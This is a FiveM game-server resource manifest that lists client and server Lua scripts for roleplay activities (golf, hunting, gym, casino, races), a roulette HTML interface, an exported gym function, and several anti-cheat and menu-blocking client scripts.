resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

client_scripts {
    'config.lua',
    'client/golf.lua',
    'client/hunting.lua',
    'client/gym.lua',
    'client/casino.lua',
    'client/recordlabel.lua',
    'client/races.lua',
}

server_scripts {
    'config.lua',
    'server/golf.lua',
    'server/main.lua',
    'server/hunting.lua',
    'server/gym.lua',
    'server/races.lua',
}

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"

ui_page('ui/roulette/roulette.html')

files {
    'ui/roulette/roulette.html',
    'ui/roulette/roulette.css',
}
client_script "@lcrp-radialmenu/gui.lua"

client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"

exports {
    "MyGym"
}

client_script '@s800w22/11313.lua'